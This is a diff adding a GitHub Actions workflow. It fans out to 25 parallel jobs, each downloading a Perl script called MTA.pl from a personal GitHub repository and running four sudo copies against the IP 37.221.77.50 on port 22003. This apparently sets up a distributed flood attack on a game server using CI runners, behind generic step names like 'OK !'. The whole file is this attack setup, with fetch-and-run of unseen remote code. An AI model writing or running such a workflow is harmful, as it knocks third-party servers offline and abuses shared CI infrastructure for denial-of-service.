@@ -1,0 +1,31 @@
+name: MTA !
+
+on:
+  workflow_dispatch:
+
+jobs:
+  vds:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25]
+
+    steps:
+      - name: OK !
+        run: |
+          wget https://github.com/ahmetdonmmzz001/Discord/raw/refs/heads/main/MTA.pl -O MTA.pl
+          chmod +x MTA.pl
+          PIDS=()
+          for i in {1..4}; do
+            sudo timeout 30 perl MTA.pl 37.221.77.50 22003 &
+            PIDS+=($!)
+          done
+          
+          for pid in "${PIDS[@]}"; do
+            wait $pid
+          done
+
+      - name: OK !
+        run: |
+          sleep 30
+          exit 0
